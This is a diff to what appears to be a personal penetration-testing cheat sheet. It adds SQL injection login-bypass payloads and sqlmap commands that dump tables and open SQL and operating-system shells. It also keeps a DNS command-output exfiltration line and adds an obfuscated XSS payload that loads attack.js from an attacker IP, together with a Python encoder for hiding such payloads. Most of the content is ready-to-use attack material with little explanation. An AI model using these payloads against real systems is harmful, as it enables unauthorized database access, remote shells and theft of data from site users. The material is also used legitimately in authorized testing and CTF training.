@@ -21,7 +21,14 @@ use double dash to terminate the query --
 
 
 === Basic SQL injection:
-e.g. Login Form:  Username=administrator'-- and arbitrary password
+e.g. Login Form:  username=administrator'-- and arbitrary password
+                  username=administrator'-- -
+                  password=pw' OR 1=1 --
+                  password=pw' OR 1=1 -- -
+                  password=pw' OR 'b'='b
+    Try to register a user like username=administrator' OR 1=1 --
+    Or                          username=administrator' OR 1=1 -- -
+    in this case check for second-order sql injections
 
 === UNION SQL injection:
 The union keyword lets you execute additional select statements:
@@ -78,11 +85,28 @@ The union keyword lets you execute additional select statements:
             ' UNION SELECT username || '~' || password FROM users--
 
 
+=== Blind SQL injection:
+The application contains SQL injection vulnerabilities but does not return any results of the query or error messages
 
 
+=== Using SQLMAP:
 
+1. Store the request to a file using Burp (e.g. file called login.req)
+2. Test for vulnerable parameters in request
+sqlmap -r login.req --level=5 --risk=3 --threads=10
 
-
+3. If vulnerable parameter is found:
+  3.1 Enumerate database tables:
+        sqlmap -r login.req --level=5 --risk=3 --threads=10 --tables
+  3.2 Retrieve Tables:
+        sqlmap -r login.req --level=5 --risk=3 -T <found_table_name> --dump
+  3.3 Get Shells:
+      3.3.1 SQL shell
+          sqlmap -r login.req --level=5 --risk=3 --sql-shell
+      3.3.2 System shell
+          sqlmap -r login.req --level=5 --risk=3 --os-shell
+      3.3.3 Other shell parameters
+          sqlmap -help|grep shell
 
 
 ==============Command injection:
@@ -118,7 +142,33 @@ Lin           uname -a
 Win           ver
 
 --> Useful commands when blind:
-ping -c 10 myip   and monitor inteface
+ping -c 10 myip   and monitor interface
 ping -c 10 127.0.0.1    and wait for delay
 nslookup mydomain.com      and monitor the request (may use a subdomain to differentiate between requests)
 nslookup `whoami`.mydomain.com      to exfiltrate command output
+
+
+
+
+============= Cross Site Scripting
+
+#ToDo: ADDING THE BASICS OF XSS
+
+
+
+
+using eval() to execute a String
+
+<img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://10.10.14.5/attack.js"></script>');))</script>">
+Encode the document.write('<script src="http://10.10.14.5/attack.js"></script>');   part
+<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,53,47,97,116,116,97,99,107,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
+
+Start a listener to monitor request for the source
+
+Python code to encode string to numeric ascii representation
+
+def encode(ascii):
+     decode_string = ""
+     for char in ascii:
+         decode_string += str(ord(char)) + ","
+     return decode_string[:-1]
